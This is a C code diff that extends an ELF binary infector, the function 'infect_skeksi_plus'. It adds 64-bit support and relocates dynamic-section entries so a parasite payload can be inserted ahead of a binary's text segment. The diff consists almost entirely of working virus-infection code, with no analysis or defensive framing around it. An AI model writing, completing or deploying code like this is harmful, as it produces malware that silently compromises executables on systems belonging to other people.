@@ -306,6 +306,7 @@ uint64_t infect_skeksi_plus(char *elfname, char *parasite, size_t size) {
         Elf32_Ehdr *ehdr;
         Elf32_Phdr *phdr;
         Elf32_Shdr *shdr;
+        Elf32_Dyn *dyn;
         ehdr = (Elf32_Ehdr *)mapped;
         phdr = (Elf32_Phdr *)&mapped[ehdr->e_phoff];
         shdr = (Elf32_Shdr *)&mapped[ehdr->e_shoff];
@@ -336,8 +337,8 @@ uint64_t infect_skeksi_plus(char *elfname, char *parasite, size_t size) {
             if (i == text_index)
                 continue;
             if (phdr[i].p_vaddr < orgin_text_vaddr) {
-                phdr[i].p_vaddr += vend;
-                phdr[i].p_paddr += vend;
+                phdr[i].p_vaddr += align_to_4k(vend);
+                phdr[i].p_paddr += align_to_4k(vend);
                 continue;
             }
 
@@ -352,12 +353,31 @@ uint64_t infect_skeksi_plus(char *elfname, char *parasite, size_t size) {
                 shdr[i].sh_size += PAGE_SIZE;
             }
             else if (shdr[i].sh_addr < orgin_text_vaddr) {
-                shdr[i].sh_addr += vend;
+                shdr[i].sh_addr += align_to_4k(vend);
             }
             // else if (shdr[i].sh_addr >= orgin_text_vaddr + orgin_text_size) {
             //     shdr[i].sh_addr += PAGE_SIZE;
             // }
         }
+
+        // start----------------------- edit .dynamic
+        // 32: REL
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == PT_DYNAMIC) {
+                dyn = (Elf32_Dyn *)(mapped + phdr[i].p_offset);
+                for (int j = 0; j < phdr[i].p_filesz / sizeof(Elf32_Dyn); j++) {
+                    if (dyn[j].d_tag == DT_STRTAB |
+                        dyn[j].d_tag == DT_SYMTAB |
+                        dyn[j].d_tag == DT_REL | 
+                        dyn[j].d_tag == DT_JMPREL | 
+                        dyn[j].d_tag == DT_VERNEED | 
+                        dyn[j].d_tag == DT_VERSYM) {
+                            dyn[j].d_un.d_val += align_to_4k(vend);
+                    } 
+                }
+            }
+        }
+        // end------------------------- edit .dynamic
 
         // file layout
         for (int i = 0; i < ehdr->e_phnum; i++) {
@@ -381,7 +401,94 @@ uint64_t infect_skeksi_plus(char *elfname, char *parasite, size_t size) {
     }
 
     else if (MODE == ELFCLASS64) {
-        ;
+        Elf64_Ehdr *ehdr;
+        Elf64_Phdr *phdr;
+        Elf64_Shdr *shdr;
+        Elf64_Dyn *dyn;
+        ehdr = (Elf64_Ehdr *)mapped;
+        phdr = (Elf64_Phdr *)&mapped[ehdr->e_phoff];
+        shdr = (Elf64_Shdr *)&mapped[ehdr->e_shoff];
+
+        // memory layout
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == PT_LOAD) {
+                if (phdr[i].p_flags == (PF_R | PF_X)) {
+                    text_index = i;
+                    for (int j = 0; j < i; j++) {
+                        if (phdr[j].p_vaddr < min_paddr)
+                            min_paddr = phdr[j].p_vaddr;
+                    }
+                    orgin_text_vaddr = phdr[i].p_vaddr;
+                    orgin_text_size = phdr[i].p_memsz;
+                    orgin_text_offset = phdr[i].p_offset;
+                    phdr[i].p_memsz += PAGE_SIZE;
+                    phdr[i].p_vaddr -= PAGE_SIZE;
+                    phdr[i].p_paddr -= PAGE_SIZE;
+                    parasite_addr = phdr[i].p_vaddr;
+                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    break;
+                }
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (i == text_index)
+                continue;
+            if (phdr[i].p_vaddr < orgin_text_vaddr) {
+                phdr[i].p_vaddr += align_to_4k(vend);
+                phdr[i].p_paddr += align_to_4k(vend);
+                continue;
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_addr == orgin_text_vaddr) {
+                shdr[i].sh_addr -= PAGE_SIZE;
+                shdr[i].sh_size += PAGE_SIZE;
+            }
+            else if (shdr[i].sh_addr < orgin_text_vaddr) {
+                shdr[i].sh_addr += align_to_4k(vend);
+            }
+        }
+
+        // start----------------------- edit .dynamic
+        // 64: RELA
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == PT_DYNAMIC) {
+                dyn = (Elf64_Dyn *)(mapped + phdr[i].p_offset);
+                for (int j = 0; j < phdr[i].p_filesz / sizeof(Elf64_Dyn); j++) {
+                    if (dyn[j].d_tag == DT_STRTAB |
+                        dyn[j].d_tag == DT_SYMTAB |
+                        dyn[j].d_tag == DT_RELA | 
+                        dyn[j].d_tag == DT_JMPREL | 
+                        dyn[j].d_tag == DT_VERNEED | 
+                        dyn[j].d_tag == DT_VERSYM) {
+                            dyn[j].d_un.d_val += align_to_4k(vend);
+                    } 
+                }
+            }
+        }
+        // end------------------------- edit .dynamic
+
+        // file layout
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (i == text_index) {
+                phdr[i].p_filesz += PAGE_SIZE;
+                continue;
+            }
+            if (phdr[i].p_offset > orgin_text_offset) {
+                phdr[i].p_offset += PAGE_SIZE;
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_offset >= orgin_text_offset + orgin_text_size) {
+                shdr[i].sh_offset += PAGE_SIZE;
+            }
+        }
+
+        // elf节头表偏移PAGE_SIZE
+        ehdr->e_shoff += PAGE_SIZE;
     }
 
     close(fd);
